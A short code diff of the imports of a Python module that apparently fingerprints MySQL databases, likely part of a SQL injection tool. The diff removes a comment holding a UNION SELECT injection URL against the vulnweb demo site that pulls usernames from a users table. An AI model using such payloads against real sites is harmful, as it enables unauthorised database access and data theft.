@@ -20,12 +20,11 @@ from core.config import MYSQL_SERVER_VERSIONS
 from core.config import DATABASE_NAME
 from core.config import GET_CURRENT_USER
 
+
 from core.config import OS
 from core import colors as color
 from core.utils import  urlExplode
 
-
-## http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,(SELECT+uname+FROM+acuart.users+WHERE%202=2),8,9,10,11
 
 '''
 mysql db fingerprint
